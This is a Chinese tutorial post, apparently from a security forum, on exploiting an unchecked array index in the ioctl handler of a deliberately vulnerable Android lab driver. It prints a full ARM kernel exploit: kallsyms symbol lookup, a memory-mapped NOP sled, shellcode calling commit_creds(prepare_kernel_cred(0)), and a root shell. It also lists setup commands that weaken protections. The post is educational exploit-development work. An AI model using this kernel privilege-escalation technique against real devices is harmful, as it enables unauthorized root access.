
# [原创]一个内核驱动的数组越界访问漏洞

昨天弄了下这个驱动，写了个文章，可能水平不高，想了想还是拿出来分享下吧，大佬们别笑我。。。

我想给大家介绍一个安卓内核驱动的数组访问越界漏洞。关于如何搭建漏洞环境可以看我的相关博文，里面介绍了如何获得相关源码以及模拟器内核等的环境设置。

[953K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4S2V1M7$3S2S2L8#2)9J5k6h3y4G2L8g2)9J5c8U0t1H3x3e0S2Q4x3V1j5H3y4q4)9J5c8U0p5H3i4K6u0r3b7h3&6V1M7X3!0A6k6q4)9J5k6r3g2^5M7r3I4G2K9i4c8S2N6r3W2G2L8W2)9J5k6p5E0W2M7X3&6W2L8q4)9J5k6s2y4@1j5h3y4C8i4K6u0V1j5Y4g2X3k6X3g2J5i4K6u0V1L8%4k6W2M7X3k6D9L8%4N6Q4x3V1j5`.](https://bbs.kanxue.com/elink@a61K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4S2V1M7$3S2S2L8#2)9J5k6h3y4G2L8g2)9J5c8U0t1H3x3e0S2Q4x3V1j5H3y4q4)9J5c8U0p5H3i4K6u0r3b7h3&6V1M7X3!0A6k6q4)9J5k6r3g2^5M7r3I4G2K9i4c8S2N6r3W2G2L8W2)9J5k6p5E0W2M7X3&6W2L8q4)9J5k6s2y4@1j5h3y4C8i4K6u0V1j5Y4g2X3k6X3g2J5i4K6u0V1L8%4k6W2M7X3k6D9L8%4N6Q4x3V1j5`.)

你也可以看我其他的博文，有关于如何编译内核模块的，可以帮你更好地完成实验。

同时，我也录了一个视频，如果不想看文章的朋友可以直接看视频。

[b78K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6&6L8%4g2@1N6g2)9J5k6h3u0W2i4K6u0r3y4p5^5^5k6U0q4m8x3p5^5$3e0h3x3`.](https://bbs.kanxue.com/elink@223K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6&6L8%4g2@1N6g2)9J5k6h3u0W2i4K6u0r3y4p5^5^5k6U0q4m8x3p5^5$3e0h3x3`.)

好了，先让我来看看那个杂项驱动的源码。

```
CommandHandler handlers[] = {

   {

     .runHandler = &doNothingIntializer

   },

   {

     .runHandler = &doNothingIntializer

   }

};



long ai_ch_ioctl(struct file *filp,

                  unsigned int cmd,

                  unsigned long arg)

{

 unsigned int handler_index = arg;



  switch (cmd) {

    case RUN_COMMAND_HANDLER:

       handlers[handler_index].runHandler();

       break;

    default :

       printk("Unknown ioctl cmd: %d", cmd);

       return -1;

  }

  return 0;

}
```

我这里就不介绍杂项设备了，网上有不少资料。这里的漏洞就是我们调用

`handlers[handler_index].runHandler();`

时，代码没有检测我们输入的`handler_index`，我们就可以访问数组外的地址，从而有可能使其调到我们指定的位置执行代码。这里有张图很好，可以看下。

![](https://bbs.kanxue.com/upload/attach/201806/753288_ANNPR7DN4NU2QYX.png)

基本的想法就是这里我们输入0的话，它会访问`handlers[0]`所指向的函数，这里就是`0xC00C1000`。 如果我们输入4，它就会访问`0xDEADBEEF`处的函数了。

让我们看下solution的源码。里面有这个`get_symbol`函数。

```
__u32

get_symbol(char *name)

{

        FILE *f;

        __u32 addr;

        char dummy, sname[512];

        int ret = 0;



        f = fopen("/proc/kallsyms", "r");

        if (!f) {

                return 0;

        }



        while (ret != EOF) {

                ret = fscanf(f, "%p %c %s\n", (void **) &addr, &dummy, sname);

                if (ret == 0) {

                        fscanf(f, "%s\n", sname);

                        continue;

                }

                if (!strcmp(name, sname)) {

                        printf("[+] resolved symbol %s to %p\n", name, (void *) addr);

                        return addr;

                }

        }



        return 0;

}
```

这个函数就是为了获得`commit_creds` 和 `prepare_kernel_cred`的地址，从而在shellcode里面运行`commit_creds(prepare_kernel_cred)`从而变成root id。Main函数也非常简单。

```
int main(void){



  commit_creds =  get_symbol("commit_creds");

  prepare_kernel_cred = get_symbol("prepare_kernel_cred");





  int cmd_handler = open("/dev/array_index", O_RDWR);

  check(cmd_handler >= 0, "Error opening challenge device");



   __u32 mmap_start = 0x02000000, mmap_size = 0x15000;



   printf("[+] Mapping userspace memory at 0x%x\n", mmap_start);



   void * mapped = mmap((void*)mmap_start, mmap_size, PROT_READ|PROT_WRITE|PROT_EXEC,

       MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0);

   check(mapped != MAP_FAILED, "Failed mapping");



   //0x00000000 is nop for ARM

   bzero( (void*)mmap_start, mmap_size );



   __u32 jump[] = {

       //00000000 <_start>:

       /*   0:*/   0xe92d4010,           //  push    {r4, lr}

       /*   4:*/   0xe59f3010,           //  ldr r3, [pc, #16]   ; 1c <_start+0x1c> (prepare_kernel_creds)

       /*   8:*/   0xe3a00000,           //  mov r0, #0

       /*   c:*/   0xe12fff33,           //  blx r3

       /*  10:*/   0xe59f3008,           //  ldr r3, [pc, #8]    ; 20 <_start+0x20>  (commit_creds)

       /*  14:*/   0xe12fff33,           //  blx r3

       /*  18:*/   0xe8bd8010,           //  pop {r4, pc}

       /*  1c:*/   prepare_kernel_cred,  //  .word   prepare_kernel_cred

       /*  20:*/   commit_creds          //  .word   commit_creds

   };



   memcpy( (void*)mmap_start+mmap_size - sizeof(jump), jump, sizeof(jump));



  printf("[+] Triggering the exploit\n");

  int rc = ioctl(cmd_handler, RUN_COMMAND_HANDLER, 0x601);

  check(rc != -1, "IOCTL failed");



  printf("uid=%d, euid=%d\n",getuid(), geteuid() );



  if(!getuid())

    execl( "/system/bin/sh", "sh", (char*) NULL);



  return 0;

error:

  return -1;

}
```

这里首先`mmap`了一段内存，然后清空了内存，在内存最后面复制上我们的shellcode。这保证了我们jump到指定地址后可以一路通过nop指令滑到我们那个shellcode。好了，大致原理就是这个，听起来很简单吧，但是实际操作起来却又会有不少问题。

好了，让我们动手吧。

首先，改变一下驱动源代码。

![](https://bbs.kanxue.com/upload/attach/201806/753288_XWYBYJMN9ZSRVFU.png)

这里我们打印出array后面200个地址内存的数值，从中选择一个合理的基地址`mmap`。这里因为只是用这个介绍漏洞所以我们偷下懒。实际上我们需要一个个去试`index`直到我们找到合适的`mmap`地址为止。我有尝试写一个脚本自动化选择那个基址，但是因为涉及到多线程什么的，还要考虑那个脚本里面启动模拟器等等问题，最终没弄成，所以直接偷懒找了个基址。有兴趣的朋友也可以自己去写下脚本。

好了，我们看下加载驱动时它打印出来的那些地址。

![](https://bbs.kanxue.com/upload/attach/201806/753288_MZW7WMFMSJ43XX2.png)

这里我直接选了一小段出来。这里选择地址需要比较小心。因为地址最后一位如果是1的话，跳到那里会执行thumb指令集，而我们的shellcode用的是arm指令集，所以必须选偶数地址。这里我选择了165那里的那个地址，所以solution的代码变成了这样。

![](https://bbs.kanxue.com/upload/attach/201806/753288_VWTU3A8UMT5B933.png)

在你使用这个二进制文件前，必须得在`adb shell`里面执行这两条指令。

"`chmod 777 /dev/array_index`"

"`echo 0 > /proc/sys/kernel/kptr_restrict`"

第一条是为了让普通权限的用户也能写那个杂项驱动。第二条是为了让用户可以获取内核那两个提权函数的地址。因为这里只是一个示例性的exp，所以这些前提就不去计较了。

最后，跑下exp就好啦。

![](https://bbs.kanxue.com/upload/attach/201806/753288_Y5UZYZQ4EWPAJFG.png)

所有的代码可以去我的github上面下载:`samohyes`。

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)
